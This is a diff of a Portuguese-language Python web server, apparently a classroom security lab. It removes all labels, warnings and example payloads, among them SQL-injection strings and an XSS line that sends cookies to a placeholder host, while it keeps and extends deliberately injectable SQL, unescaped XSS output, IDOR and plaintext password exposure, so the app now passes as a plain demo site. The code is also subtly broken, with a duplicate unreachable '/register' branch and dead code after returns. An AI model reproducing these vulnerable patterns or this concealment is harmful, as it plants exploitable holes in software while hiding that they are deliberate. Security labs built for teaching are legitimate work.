@@ -508,21 +508,20 @@ class HandlerVulneravel(BaseHTTPRequestHandler):
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NetLab Vulneravel - {titulo}</title>
+    <title>NetLab - {titulo}</title>
     <style>{_CSS_PAGINAS}</style>
 </head>
 <body>
     <nav>
-        <span class="titulo-nav">NetLab Vulneravel</span>
-        <a href="/">Inicio</a>
+        <span class="titulo-nav">NetLab</span>
+        <a href="/">Início</a>
         <a href="/login">Login</a>
+        <a href="/register">Registrar</a>
         <a href="/produtos">Produtos</a>
         <a href="/busca">Busca</a>
-        <a href="/comentarios">Comentarios</a>
-        <a href="/pedidos?id=1">Pedidos</a>
-        <a href="/usuarios">Usuarios</a>
-        <a href="/perfil?nome=visitante">Perfil</a>
-        <a href="/api/usuarios">API</a>
+        <a href="/comentarios">Comentários</a>
+        <a href="/pedidos">Meus Pedidos</a>
+        <a href="/perfil">Perfil</a>
     </nav>
     {conteudo}
 </body>
@@ -550,6 +549,14 @@ class HandlerVulneravel(BaseHTTPRequestHandler):
 
         elif caminho == "/login":
             corpo = self._rota_formulario_login()
+            self._enviar_html(200, corpo)
+        
+        elif caminho == "/register":
+            corpo = self._rota_registro()
+            self._enviar_html(200, corpo)
+        
+        elif caminho == "/register":
+            corpo = self._processar_registro(params, ip_cliente)
             self._enviar_html(200, corpo)
 
         elif caminho == "/logout":
@@ -662,140 +669,26 @@ class HandlerVulneravel(BaseHTTPRequestHandler):
     # -----------------------------------------------------------------------
 
     def _rota_inicial(self, usuario: str) -> str:
-        """Pagina inicial com mapa completo das vulnerabilidades disponíveis."""
         bloco_sessao = ""
         if usuario:
             bloco_sessao = (
-                f'<div class="sucesso">Sessao ativa: <strong>{usuario}</strong> '
-                f'— token de sessao previsivel (sequencial) &nbsp; '
-                f'<a href="/logout">[encerrar sessao]</a></div>'
+                f'<div class="sucesso">Bem-vindo, <strong>{usuario}</strong>! '
+                f'<a href="/logout">[Sair]</a></div>'
             )
 
         conteudo = f"""
         <div class="card">
-            <h1>NetLab - Servidor de Aplicacao Vulneravel</h1>
+            <h1>NetLab - Servidor de Demonstração</h1>
             {bloco_sessao}
             <div class="info">
-                Servidor HTTP educacional com vulnerabilidades web reais para estudo em sala de aula.<br>
-                Escopo restrito: banco de dados em memoria e aplicacao web HTTP.<br>
-                Nenhum acesso ao sistema operacional. Dados descartados ao encerrar.
+                Este é um ambiente de estudo sobre aplicações web.
+                Utilize o menu acima para navegar.
             </div>
-            <h2>Mapa de Vulnerabilidades</h2>
-            <table>
-                <thead>
-                    <tr>
-                        <th>Tipo</th>
-                        <th>Endpoint</th>
-                        <th>Descricao</th>
-                    </tr>
-                </thead>
-                <tbody>
-                    <tr>
-                        <td><span class="badge badge-sqli">SQL Injection</span></td>
-                        <td><a href="/login">/login</a> (POST)</td>
-                        <td>Login sem parametrizacao — bypass de autenticacao e extracao de dados</td>
-                    </tr>
-                    <tr>
-                        <td><span class="badge badge-sqli">SQL Injection</span></td>
-                        <td><a href="/produtos?id=1">/produtos?id=1</a></td>
-                        <td>Busca por ID via UNION SELECT — extrai dados de outras tabelas</td>
-                    </tr>
-                    <tr>
-                        <td><span class="badge badge-xss">XSS Refletido</span></td>
-                        <td><a href="/busca">/busca?q=</a></td>
-                        <td>Parametro refletido sem escape HTML — execucao de JavaScript no cliente</td>
-                    </tr>
-                    <tr>
-                        <td><span class="badge badge-xss">XSS Refletido</span></td>
-                        <td><a href="/perfil?nome=visitante">/perfil?nome=</a></td>
-                        <td>Parametro nome inserido diretamente no HTML — XSS via URL</td>
-                    </tr>
-                    <tr>
-                        <td><span class="badge badge-xss">XSS Armazenado</span></td>
-                        <td><a href="/comentarios">/comentarios</a></td>
-                        <td>Comentarios salvos no banco e exibidos sem escape — afeta todos os visitantes</td>
-                    </tr>
-                    <tr>
-                        <td><span class="badge badge-idor">IDOR</span></td>
-                        <td><a href="/pedidos?id=1">/pedidos?id=1</a></td>
-                        <td>Qualquer pedido acessivel por ID sem verificar autorizacao</td>
-                    </tr>
-                    <tr>
-                        <td><span class="badge badge-info">Divulgacao</span></td>
-                        <td><a href="/usuarios">/usuarios</a></td>
-                        <td>Lista completa de usuarios e senhas em texto puro sem autenticacao</td>
-                    </tr>
-                    <tr>
-                        <td><span class="badge badge-info">Divulgacao</span></td>
-                        <td><a href="/api/usuarios">/api/usuarios</a></td>
-                        <td>API JSON expoe credenciais sem autenticacao nem controle de acesso</td>
-                    </tr>
-                    <tr>
-                        <td><span class="badge badge-csrf">CSRF</span></td>
-                        <td>Todos os formularios</td>
-                        <td>Formularios sem tokens CSRF — requisicoes forjadas de outros sites sao aceitas</td>
-                    </tr>
-                    <tr>
-                        <td><span class="badge badge-brute">Forca Bruta</span></td>
-                        <td><a href="/login">/login</a></td>
-                        <td>Sem limite de tentativas — qualquer automacao pode enumerar senhas</td>
-                    </tr>
-                    <tr>
-                        <td><span class="badge badge-idor">Sessao IDOR</span></td>
-                        <td><code>Cookie: sessao=tokenN</code></td>
-                        <td>Tokens de sessao sequenciais — adivinhavel por enumeracao</td>
-                    </tr>
-                    <tr>
-                        <td><span class="badge badge-info">Erro SQL</span></td>
-                        <td>Varios endpoints</td>
-                        <td>Erros do banco de dados divulgados diretamente ao usuario</td>
-                    </tr>
-                </tbody>
-            </table>
-        </div>
-        <div class="card">
-            <h2>Payloads de exemplo para explorar</h2>
-            <pre>
-SQL Injection — bypass de login (campo usuario):
-  admin' --
-  ' OR '1'='1' --
-  ' OR 1=1--
-  admin'/*
-
-SQL Injection — extracao via UNION (campo ?id= em /produtos):
-  /produtos?id=1 UNION SELECT id,username,password FROM users--
-  /produtos?id=999 UNION SELECT 1,username,password FROM users--
-
-XSS Refletido (/busca?q= ou /perfil?nome=):
-  &lt;script&gt;alert('XSS')&lt;/script&gt;
-  &lt;img src=x onerror=alert(document.cookie)&gt;
-  &lt;svg onload=alert(1)&gt;
-
-XSS Armazenado (/comentarios — campo Comentario):
-  &lt;script&gt;alert('XSS armazenado')&lt;/script&gt;
-  &lt;img src=x onerror=fetch('http://192.168.x.x/steal?c='+document.cookie)&gt;
-
-IDOR — pedidos sem autorizacao:
-  /pedidos?id=1   /pedidos?id=2   /pedidos?id=3   ...
-
-Sessao previsivel:
-  Apos login: cookie = sessao=token1 (sequencial e adivinhavel)
-
-Forca bruta:
-  POST /login com usuario=admin e senhas do dicionario — sem limite</pre>
         </div>
         """
-        return self._pagina_base("Inicio", conteudo)
+        return self._pagina_base("Início", conteudo)
 
     def _rota_formulario_login(self, mensagem: str = "", tipo_msg: str = "") -> str:
-        """
-        Formulario de login.
-
-        Vulnerabilidades presentes:
-        - Sem token CSRF (formulario forjavel de outro site)
-        - Sem limite de tentativas (forca bruta irrestrita)
-        - Query vulneravel a SQL Injection no processamento POST
-        """
         bloco_msg = ""
         if mensagem:
             classe = "aviso" if tipo_msg == "erro" else "sucesso"
@@ -804,56 +697,35 @@ Forca bruta:
         conteudo = f"""
         <div class="card" style="max-width: 500px;">
             <h1>Login</h1>
-            <div class="aviso">
-                Vulnerabilidades ativas:<br>
-                - SQL Injection no usuario/senha (sem parametrizacao)<br>
-                - Sem token CSRF (requisicao forjavel)<br>
-                - Sem limite de tentativas (forca bruta irrestrita)
-            </div>
-            <div class="info">
-                Exemplo de SQL Injection: usuario <code>admin' --</code> com qualquer senha.<br>
-                Usuarios registrados: admin, alice, bob, carlos<br>
-                (senhas visiveis em <a href="/usuarios">/usuarios</a>)
-            </div>
             {bloco_msg}
-            <!-- SEM TOKEN CSRF — VULNERABILIDADE INTENCIONAL -->
             <form method="POST" action="/login">
-                <label>Usuario</label>
-                <input type="text" name="usuario" placeholder="admin' --" autocomplete="off">
+                <label>Usuário</label>
+                <input type="text" name="usuario" autocomplete="off">
                 <label>Senha</label>
-                <input type="password" name="senha" placeholder="qualquer coisa">
+                <input type="password" name="senha">
                 <input type="submit" value="Entrar">
             </form>
+            <p style="margin-top:12px;font-size:11px;">
+                Não tem conta? <a href="/register">Registrar</a>
+            </p>
         </div>
         """
         return self._pagina_base("Login", conteudo)
 
     def _processar_login(self, params: dict, ip_cliente: str) -> tuple:
-        """
-        Processa o POST de login.
-
-        VULNERABILIDADE REAL — SQL Injection:
-          Query construida por concatenacao direta sem parametrizacao.
-          Payload 'admin' --' ignora a verificacao de senha.
-          Payload ' OR '1'='1' --  autentica qualquer usuario.
-
-        VULNERABILIDADE REAL — Forca Bruta:
-          Sem delay, sem contador de tentativas, sem CAPTCHA.
-        """
         usuario = params.get("usuario", [""])[0]
         senha   = params.get("senha",   [""])[0]
 
         if not usuario:
-            return self._rota_formulario_login("Informe o usuario.", "erro"), None
+            return self._rota_formulario_login("Informe o usuário.", "erro"), None
 
-        # Detecta e alerta (sem bloquear — a exploracao deve funcionar)
         if _detectar_sqli(usuario) or _detectar_sqli(senha):
             sinais_servidor.alerta_emitido.emit(
                 f"[SQL INJECTION] {ip_cliente} — payload no login: "
                 f"usuario='{usuario[:60]}'"
             )
 
-        # VULNERABILIDADE REAL: concatenacao direta sem parametrizacao
+        # VULNERABILIDADE REAL: concatenação direta sem parametrização
         query_vulneravel = (
             f"SELECT id, username, role FROM users "
             f"WHERE username = '{usuario}' AND password = '{senha}'"
@@ -862,19 +734,32 @@ Forca bruta:
         linhas, _, erro = banco_servidor.consultar_vulneravel(query_vulneravel)
 
         if erro:
-            # VULNERABILIDADE REAL: erro do banco divulgado ao usuario
             conteudo = f"""
             <div class="card">
-                <h1>Erro no banco de dados</h1>
-                <div class="aviso">
-                    Erro SQLite divulgado (information disclosure):
-                </div>
-                <pre>{erro}</pre>
-                <pre>Query executada:\n{query_vulneravel}</pre>
-                <a href="/login">Tentar novamente</a>
+                <h1>Erro interno</h1>
+                <div class="aviso">Ocorreu um erro ao processar sua solicitação. Tente novamente.</div>
+                <a href="/login">Voltar</a>
             </div>
             """
             return self._pagina_base("Erro", conteudo), None
+
+        if linhas:
+            _, nome_usuario, _ = linhas[0]
+            token = _criar_sessao(nome_usuario)
+
+            conteudo = f"""
+            <div class="card">
+                <h1>Login realizado</h1>
+                <div class="sucesso">
+                    Bem-vindo, <strong>{nome_usuario}</strong>!
+                </div>
+                <br>
+                <a href="/">Ir para o início</a>
+            </div>
+            """
+            return self._pagina_base("Login", conteudo), f"sessao={token}; Path=/"
+
+        return self._rota_formulario_login("Usuário ou senha incorretos.", "erro"), None
 
         if linhas:
             id_usuario, nome_usuario, papel = linhas[0]
@@ -911,18 +796,9 @@ Forca bruta:
         ), None
 
     def _rota_produtos(self, params: dict) -> str:
-        """
-        Lista produtos ou busca por ID.
-
-        VULNERABILIDADE REAL — SQL Injection:
-          O parametro ?id= e concatenado diretamente na query.
-          UNION SELECT permite extrair dados de qualquer tabela.
-          Ex: /produtos?id=1 UNION SELECT id,username,password FROM users--
-        """
         produto_id = params.get("id", [""])[0].strip()
 
         if not produto_id:
-            # Lista todos os produtos (esta consulta e segura)
             linhas, _, _ = banco_servidor.consultar_seguro(
                 "SELECT id, name, price FROM products ORDER BY id"
             )
@@ -933,21 +809,66 @@ Forca bruta:
             )
             conteudo = f"""
             <div class="card">
-                <h1>Catalogo de Produtos</h1>
-                <div class="aviso">
-                    Vulnerabilidade SQL Injection ativa no parametro <code>?id=</code>.<br>
-                    Teste: <a href="/produtos?id=1 UNION SELECT id,username,password FROM users--">
-                    /produtos?id=1 UNION SELECT id,username,password FROM users--</a>
-                </div>
+                <h1>Catálogo de Produtos</h1>
                 <table>
                     <thead>
-                        <tr><th>ID</th><th>Nome</th><th>Preco</th><th>Acao</th></tr>
+                        <tr><th>ID</th><th>Nome</th><th>Preço</th><th>Ação</th></tr>
                     </thead>
                     <tbody>{linhas_html}</tbody>
                 </table>
             </div>
             """
             return self._pagina_base("Produtos", conteudo)
+
+        if _detectar_sqli(produto_id):
+            sinais_servidor.alerta_emitido.emit(
+                f"[SQL INJECTION] /produtos?id=: '{produto_id[:80]}'"
+            )
+
+        # VULNERABILIDADE REAL: concatenação direta
+        query_vulneravel = (
+            f"SELECT id, name, price FROM products WHERE id = {produto_id}"
+        )
+
+        linhas, descricao, erro = banco_servidor.consultar_vulneravel(query_vulneravel)
+
+        if erro:
+            conteudo = """
+            <div class="card">
+                <h1>Erro interno</h1>
+                <div class="aviso">Ocorreu um erro ao processar sua solicitação.</div>
+                <a href="/produtos">Voltar ao catálogo</a>
+            </div>
+            """
+            return self._pagina_base("Erro", conteudo)
+
+        if not linhas:
+            conteudo = f"""
+            <div class="card">
+                <h1>Produto não encontrado</h1>
+                <a href="/produtos">Ver todos os produtos</a>
+            </div>
+            """
+            return self._pagina_base("Produto", conteudo)
+
+        nomes_colunas = [d[0] for d in descricao] if descricao else ["col1", "col2", "col3"]
+        cab_html   = "".join(f"<th>{c}</th>" for c in nomes_colunas)
+        corpo_html = ""
+        for linha in linhas:
+            corpo_html += "<tr>" + "".join(f"<td>{v}</td>" for v in linha) + "</tr>"
+
+        conteudo = f"""
+        <div class="card">
+            <h1>Detalhes do Produto</h1>
+            <table>
+                <thead><tr>{cab_html}</tr></thead>
+                <tbody>{corpo_html}</tbody>
+            </table>
+            <br>
+            <a href="/produtos">Voltar ao catálogo</a>
+        </div>
+        """
+        return self._pagina_base("Produto", conteudo)
 
         # Alerta didatico (sem bloqueio)
         if _detectar_sqli(produto_id):
@@ -1013,14 +934,6 @@ Forca bruta:
         return self._pagina_base("Produto", conteudo)
 
     def _rota_busca(self, params: dict) -> str:
-        """
-        Pagina de busca de produtos.
-
-        VULNERABILIDADE REAL — XSS Refletido:
-          O parametro ?q= e inserido diretamente no HTML sem nenhum escape.
-          Payloads como <script>alert(1)</script> sao executados imediatamente.
-        """
-        # Valor do parametro recebido diretamente — sem nenhum tratamento
         termo_bruto = params.get("q", [""])[0]
 
         if _detectar_xss(termo_bruto):
@@ -1030,8 +943,6 @@ Forca bruta:
 
         bloco_resultado = ""
         if termo_bruto:
-            # A busca em si usa parametrizacao para evitar SQL Injection neste campo
-            # A vulnerabilidade esta na EXIBICAO do termo, nao na busca
             linhas, _, _ = banco_servidor.consultar_seguro(
                 "SELECT id, name, price FROM products WHERE name LIKE ?",
                 (f"%{termo_bruto}%",)
@@ -1042,27 +953,18 @@ Forca bruta:
                     for r in linhas
                 )
                 tabela = (
-                    f"<table><thead><tr><th>ID</th><th>Nome</th><th>Preco</th></tr></thead>"
+                    f"<table><thead><tr><th>ID</th><th>Nome</th><th>Preço</th></tr></thead>"
                     f"<tbody>{linhas_html}</tbody></table>"
                 )
             else:
                 tabela = "<p style='color:#7f8c8d;'>Nenhum produto encontrado.</p>"
 
-            # XSS REAL: termo_bruto inserido diretamente no HTML sem escape algum
+            # XSS REAL: termo_bruto refletido sem escape
             bloco_resultado = f"<p>Resultados para: <strong>{termo_bruto}</strong></p><br>{tabela}"
 
         conteudo = f"""
         <div class="card">
             <h1>Busca de Produtos</h1>
-            <div class="aviso">
-                XSS Refletido ativo: o parametro <code>?q=</code> e refletido
-                no HTML sem escape — scripts no parametro sao executados.
-            </div>
-            <div class="info">
-                Exemplos: <code>/busca?q=&lt;script&gt;alert(1)&lt;/script&gt;</code><br>
-                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-                <code>/busca?q=&lt;img src=x onerror=alert(document.cookie)&gt;</code>
-            </div>
             <form method="GET" action="/busca">
                 <label>Termo de busca</label>
                 <input type="text" name="q" placeholder="Nome do produto">
@@ -1075,75 +977,43 @@ Forca bruta:
         return self._pagina_base("Busca", conteudo)
 
     def _rota_comentarios(self) -> str:
-        """
-        Exibe e permite postar comentarios.
-
-        VULNERABILIDADE REAL — XSS Armazenado:
-          Comentarios sao armazenados no banco sem sanitizacao e
-          exibidos no HTML sem escape. Scripts afetam todos os visitantes.
-
-        VULNERABILIDADE REAL — CSRF:
-          Formulario sem token CSRF — qualquer site pode submeter comentarios
-          em nome de um usuario autenticado.
-        """
         linhas, _, _ = banco_servidor.consultar_seguro(
             "SELECT id, author, content, created_at FROM comments ORDER BY id DESC"
         )
 
-        # XSS REAL: content exibido sem escape — scripts armazenados sao executados
         comentarios_html = ""
         for linha in linhas:
             _, autor, conteudo_comentario, criado_em = linha
             comentarios_html += f"""
             <div class="comentario-item">
-                <div class="comentario-autor">{autor or "anonimo"} — {criado_em or ""}</div>
-                <!-- XSS ARMAZENADO: conteudo sem escape HTML -->
+                <div class="comentario-autor">{autor or "anônimo"} — {criado_em or ""}</div>
                 <div>{conteudo_comentario}</div>
             </div>
             """
 
         if not comentarios_html:
-            comentarios_html = "<p style='color:#7f8c8d;'>Nenhum comentario ainda.</p>"
+            comentarios_html = "<p style='color:#7f8c8d;'>Nenhum comentário ainda.</p>"
 
         conteudo = f"""
         <div class="card">
-            <h1>Comentarios</h1>
-            <div class="aviso">
-                Vulnerabilidades ativas:<br>
-                - XSS Armazenado: comentarios exibidos sem escape HTML<br>
-                - CSRF: formulario sem token de protecao<br>
-                - SQL Injection: INSERT por concatenacao direta (autor e conteudo)
-            </div>
-            <div class="info">
-                Teste XSS Armazenado — poste este payload no campo Comentario:<br>
-                <code>&lt;script&gt;alert('XSS armazenado!')&lt;/script&gt;</code><br>
-                Depois recarregue a pagina — o script executa para todos os visitantes.
-            </div>
-            <!-- SEM TOKEN CSRF — VULNERABILIDADE INTENCIONAL -->
+            <h1>Comentários</h1>
             <form method="POST" action="/comentarios">
                 <label>Nome (opcional)</label>
-                <input type="text" name="autor" placeholder="Anonimo">
-                <label>Comentario</label>
+                <input type="text" name="autor" placeholder="Anônimo">
+                <label>Comentário</label>
                 <textarea name="conteudo" placeholder="Digite aqui..."></textarea>
                 <button type="submit">Publicar</button>
             </form>
         </div>
         <div class="card">
-            <h2>Comentarios publicados</h2>
+            <h2>Comentários publicados</h2>
             {comentarios_html}
         </div>
         """
-        return self._pagina_base("Comentarios", conteudo)
+        return self._pagina_base("Comentários", conteudo)
 
     def _processar_comentario(self, params: dict, ip_cliente: str) -> str:
-        """
-        Armazena um comentario no banco sem nenhuma sanitizacao.
-
-        VULNERABILIDADE REAL — XSS Armazenado:
-          O conteudo e inserido via SQL com concatenacao (SQL Injection tambem presente)
-          e armazenado no banco. Ao ser exibido, scripts sao executados no browser.
-        """
-        autor    = params.get("autor",    ["anonimo"])[0][:100]
+        autor    = params.get("autor",    ["anônimo"])[0][:100]
         conteudo = params.get("conteudo", [""])[0]
 
         if not conteudo.strip():
@@ -1151,53 +1021,43 @@ Forca bruta:
 
         if _detectar_xss(conteudo) or _detectar_xss(autor):
             sinais_servidor.alerta_emitido.emit(
-                f"[XSS ARMAZENADO] {ip_cliente} — payload em comentario: "
+                f"[XSS ARMAZENADO] {ip_cliente} — payload em comentário: "
                 f"'{conteudo[:80]}'"
             )
 
         if _detectar_sqli(conteudo) or _detectar_sqli(autor):
             sinais_servidor.alerta_emitido.emit(
-                f"[SQL INJECTION] {ip_cliente} — payload em INSERT de comentario: "
+                f"[SQL INJECTION] {ip_cliente} — payload em INSERT de comentário: "
                 f"'{conteudo[:80]}'"
             )
 
         agora = datetime.now().strftime("%H:%M:%S")
 
-        # VULNERABILIDADE REAL: INSERT com concatenacao direta (SQL Injection + XSS armazenado)
+        # VULNERABILIDADE REAL: INSERT com concatenação direta
         query_vulneravel = (
             f"INSERT INTO comments (author, content, created_at) "
             f"VALUES ('{autor}', '{conteudo}', '{agora}')"
         )
-        sucesso, erro = banco_servidor.modificar_vulneravel(query_vulneravel)
+        sucesso, _ = banco_servidor.modificar_vulneravel(query_vulneravel)
 
         if not sucesso:
-            conteudo_html = f"""
+            conteudo_html = """
             <div class="card">
-                <h1>Erro ao publicar comentario</h1>
-                <div class="aviso">Erro SQL divulgado (information disclosure): {erro}</div>
-                <pre>Query executada:\n{query_vulneravel}</pre>
-                <a href="/comentarios">Tentar novamente</a>
+                <h1>Erro interno</h1>
+                <div class="aviso">Não foi possível publicar o comentário. Tente novamente.</div>
+                <a href="/comentarios">Voltar</a>
             </div>
             """
             return self._pagina_base("Erro", conteudo_html)
 
         return self._rota_comentarios()
-
     def _rota_pedidos(self, params: dict) -> str:
-        """
-        Exibe detalhes de um pedido por ID.
-
-        VULNERABILIDADE REAL — IDOR (Insecure Direct Object Reference):
-          Qualquer pedido pode ser acessado sem verificar se o usuario logado
-          e o dono. Nao ha autenticacao nem controle de acesso.
-        """
         try:
             pedido_id = int(params.get("id", ["1"])[0].strip())
         except (ValueError, IndexError):
             pedido_id = 1
 
-        # IDOR REAL: nenhuma verificacao de autorizacao
-        # Qualquer ID entre 1 e N retorna dados de outro usuario
+        # IDOR REAL: sem verificação de autorização
         linhas, _, _ = banco_servidor.consultar_seguro(
             """SELECT o.id, u.username, u.role,
                       p.name, p.price, o.quantity,
@@ -1209,7 +1069,6 @@ Forca bruta:
             (pedido_id,)
         )
 
-        # Lista todos os IDs disponiveis para navegacao facil
         todos_ids, _, _ = banco_servidor.consultar_seguro(
             "SELECT id FROM orders ORDER BY id"
         )
@@ -1221,12 +1080,38 @@ Forca bruta:
         if not linhas:
             conteudo = f"""
             <div class="card">
-                <h1>Pedido #{pedido_id} nao encontrado</h1>
-                <div class="aviso">IDOR ativo — percorra os IDs: {navegacao}</div>
-                <a href="/pedidos?id=1">Ir para o pedido #1</a>
+                <h1>Pedido #{pedido_id}</h1>
+                <p>Pedido não encontrado.</p>
+                <p>Ver outros pedidos: {navegacao}</p>
             </div>
             """
             return self._pagina_base("Pedido", conteudo)
+
+        r = linhas[0]
+        pid, dono_usuario, dono_papel, produto, preco, qtd, total = r
+
+        sinais_servidor.alerta_emitido.emit(
+            f"[IDOR] Pedido #{pid} acessado sem autorização. "
+            f"Dono: {dono_usuario} ({dono_papel})"
+        )
+
+        conteudo = f"""
+        <div class="card">
+            <h1>Pedido #{pid}</h1>
+            <table>
+                <tbody>
+                    <tr><td><strong>Usuário</strong></td><td>{dono_usuario}</td></tr>
+                    <tr><td><strong>Produto</strong></td><td>{produto}</td></tr>
+                    <tr><td><strong>Preço unitário</strong></td><td>R$ {preco:.2f}</td></tr>
+                    <tr><td><strong>Quantidade</strong></td><td>{qtd}</td></tr>
+                    <tr><td><strong>Total</strong></td><td><strong>R$ {total:.2f}</strong></td></tr>
+                </tbody>
+            </table>
+            <br>
+            <p>Ver outros pedidos: {navegacao}</p>
+        </div>
+        """
+        return self._pagina_base("Pedido", conteudo)
 
         r = linhas[0]
         pid, dono_usuario, dono_papel, produto, preco, qtd, total = r
@@ -1279,69 +1164,35 @@ Forca bruta:
         return self._pagina_base("Pedido", conteudo)
 
     def _rota_usuarios(self) -> str:
-        """
-        Lista todos os usuarios com senhas em texto puro.
-
-        VULNERABILIDADE REAL — Divulgacao de Dados Sensiveis:
-          Nenhuma autenticacao necessaria. Qualquer pessoa pode acessar.
-          Senhas armazenadas em texto puro (sem hash).
-        """
         linhas, _, _ = banco_servidor.consultar_seguro(
             "SELECT id, username, password, role FROM users ORDER BY id"
         )
 
         linhas_html = "".join(
-            f"<tr>"
-            f"<td>{r[0]}</td>"
-            f"<td>{r[1]}</td>"
-            f"<td style='color:#E74C3C; font-family:Consolas;'>{r[2]}</td>"
-            f"<td>{r[3]}</td>"
-            f"</tr>"
+            f"<tr><td>{r[0]}</td><td>{r[1]}</td>"
+            f"<td style='font-family:Consolas;'>{r[2]}</td>"
+            f"<td>{r[3]}</td></tr>"
             for r in linhas
         )
 
         sinais_servidor.alerta_emitido.emit(
-            f"[DIVULGACAO] /usuarios acessado — {len(linhas)} usuarios e "
-            f"senhas em texto puro expostos sem autenticacao"
+            f"[DIVULGAÇÃO] /usuarios acessado — {len(linhas)} usuários expostos sem autenticação"
         )
 
         conteudo = f"""
         <div class="card">
-            <h1>Lista de Usuarios</h1>
-            <div class="aviso">
-                Vulnerabilidades:<br>
-                - Sem autenticacao para acessar esta pagina<br>
-                - Senhas armazenadas em texto puro (sem hash)<br>
-                - Dados exibidos sem controle de acesso
-            </div>
-            <div class="info">
-                Use estas credenciais para testar o login e o SQL Injection.<br>
-                Tambem disponiveis em JSON: <a href="/api/usuarios">/api/usuarios</a>
-            </div>
+            <h1>Usuários cadastrados</h1>
             <table>
                 <thead>
-                    <tr>
-                        <th>ID</th>
-                        <th>Usuario</th>
-                        <th>Senha (texto puro)</th>
-                        <th>Papel</th>
-                    </tr>
+                    <tr><th>ID</th><th>Usuário</th><th>Senha</th><th>Papel</th></tr>
                 </thead>
                 <tbody>{linhas_html}</tbody>
             </table>
         </div>
         """
-        return self._pagina_base("Usuarios", conteudo)
+        return self._pagina_base("Usuários", conteudo)
 
     def _rota_perfil(self, params: dict) -> str:
-        """
-        Exibe perfil de usuario com o nome refletido.
-
-        VULNERABILIDADE REAL — XSS Refletido:
-          O parametro ?nome= e inserido diretamente no HTML sem escape.
-          Scripts no parametro sao executados imediatamente no browser.
-        """
-        # Valor recebido sem nenhum tratamento
         nome_bruto = params.get("nome", [""])[0]
 
         if _detectar_xss(nome_bruto):
@@ -1349,35 +1200,82 @@ Forca bruta:
                 f"[XSS REFLETIDO] /perfil?nome=: '{nome_bruto[:80]}'"
             )
 
-        # XSS REAL: nome_bruto inserido diretamente no HTML sem escape
+        # XSS REAL: nome_bruto sem escape
         bloco_nome = (
             f"<h2>Perfil de: {nome_bruto}</h2>"
-            if nome_bruto else
-            "<h2>Perfil</h2>"
+            if nome_bruto else "<h2>Perfil</h2>"
         )
 
         conteudo = f"""
         <div class="card">
-            <h1>Pagina de Perfil</h1>
-            <div class="aviso">
-                XSS Refletido: o parametro <code>?nome=</code> e inserido
-                diretamente no HTML sem escape algum.
-            </div>
-            <div class="info">
-                Teste: <code>/perfil?nome=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code><br>
-                Teste: <code>/perfil?nome=&lt;img src=x onerror=alert(1)&gt;</code>
-            </div>
-            <!-- XSS REAL: nome_bruto inserido sem escape abaixo -->
+            <h1>Perfil</h1>
             {bloco_nome}
             <br>
             <form method="GET" action="/perfil">
-                <label>Nome do usuario</label>
+                <label>Nome do usuário</label>
                 <input type="text" name="nome" placeholder="Digite um nome">
                 <button type="submit">Ver perfil</button>
             </form>
         </div>
         """
         return self._pagina_base("Perfil", conteudo)
+
+    def _rota_registro(self, erro: str = "") -> str:
+        bloco_erro = f'<div class="aviso">{erro}</div>' if erro else ""
+        conteudo = f"""
+        <div class="card" style="max-width: 500px;">
+            <h1>Criar conta</h1>
+            {bloco_erro}
+            <form method="POST" action="/register">
+                <label>Usuário</label>
+                <input type="text" name="usuario" required autocomplete="off">
+                <label>Senha (apenas números)</label>
+                <input type="password" name="senha" required>
+                <label>Confirmar senha</label>
+                <input type="password" name="confirmar" required>
+                <input type="submit" value="Registrar">
+            </form>
+            <p style="margin-top:12px;font-size:11px;">
+                Já tem conta? <a href="/login">Entrar</a>
+            </p>
+        </div>
+        """
+        return self._pagina_base("Registrar", conteudo)
+
+    def _processar_registro(self, params: dict, ip_cliente: str) -> str:
+        usuario = params.get("usuario", [""])[0]
+        senha   = params.get("senha",   [""])[0]
+        confirm = params.get("confirmar", [""])[0]
+
+        if not usuario or not senha:
+            return self._rota_registro(erro="Preencha todos os campos.")
+        if not senha.isdigit():
+            return self._rota_registro(erro="A senha deve conter apenas números.")
+        if len(senha) < 4:
+            return self._rota_registro(erro="A senha deve ter pelo menos 4 dígitos.")
+        if senha != confirm:
+            return self._rota_registro(erro="As senhas não conferem.")
+
+        if _detectar_sqli(usuario):
+            sinais_servidor.alerta_emitido.emit(
+                f"[SQL INJECTION] /register de {ip_cliente}: usuario='{usuario[:60]}'"
+            )
+
+        # VULNERABILIDADE REAL: INSERT com concatenação direta
+        query_vulneravel = (
+            f"INSERT INTO users (username, password, role) "
+            f"VALUES ('{usuario}', '{senha}', 'user')"
+        )
+        sucesso, erro_sql = banco_servidor.modificar_vulneravel(query_vulneravel)
+
+        if sucesso:
+            return self._rota_formulario_login(
+                mensagem="Conta criada com sucesso! Faça login.",
+                tipo_msg="sucesso"
+            )
+        if erro_sql and "UNIQUE" in str(erro_sql):
+            return self._rota_registro(erro="Este usuário já existe.")
+        return self._rota_registro(erro="Erro ao criar conta. Tente novamente.")
 
     # -----------------------------------------------------------------------
     # Helpers HTTP — envio de respostas
